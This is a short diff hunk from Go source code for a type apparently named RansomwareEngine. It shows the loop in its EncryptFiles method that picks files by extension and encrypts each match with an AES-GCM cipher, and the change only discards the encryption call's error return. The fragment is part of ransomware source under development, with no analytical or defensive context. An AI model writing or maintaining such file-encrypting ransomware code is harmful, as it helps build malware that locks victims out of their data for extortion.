@@ -123,7 +123,7 @@ func (r *RansomwareEngine) EncryptFiles(target string, params map[string]interfa
 		ext := filepath.Ext(path)
 		for _, e := range extensions {
 			if ext == e {
-				r.encryptFile(gcm, path)
+				_ = r.encryptFile(gcm, path)
 				break
 			}
 		}
